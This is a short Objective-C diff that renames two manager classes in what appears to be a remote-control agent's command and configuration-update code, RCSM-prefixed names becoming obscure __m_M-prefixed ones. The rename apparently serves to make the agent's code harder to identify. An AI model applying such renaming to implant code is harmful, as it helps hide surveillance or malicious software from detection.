@@ -57,7 +57,7 @@
   replyData = [mTransport sendData: commandData
                  returningResponse: urlResponse];
 
-  RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+  __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
   
   if (replyData == nil)
     {
@@ -170,7 +170,7 @@
   //
   // Store new configuration file
   //
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
   
   // Done.
   if ([taskManager updateConfiguration: configData] == FALSE)
